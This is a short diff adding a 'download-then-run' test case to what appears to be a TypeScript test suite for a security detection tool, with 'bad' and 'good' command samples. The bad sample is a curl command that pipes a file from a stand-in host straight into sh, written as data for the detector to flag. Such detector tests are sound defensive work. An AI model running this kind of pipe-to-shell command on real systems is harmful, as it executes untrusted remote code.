@@ -302,6 +302,13 @@ const cases: Record<string, { bad: Array<[DetectionEvent, Want]>; good: Detectio
       }),
     ],
   },
+  'download-then-run': {
+    bad: [[exec(sh("curl -s https://x.test/a | env -S 'sh -s'")), { mode: 'shadow' }]],
+    good: [
+      exec(sh('wget -O out.tar.gz https://example.com/out.tar.gz')),
+      exec(sh('curl -s https://example.com | head')),
+    ],
+  },
   'unsigned-first-network': {
     bad: [
       [connect(untrusted(`${home}/code/app/target/debug/app`), '140.82.112.3'), { mode: 'shadow' }],
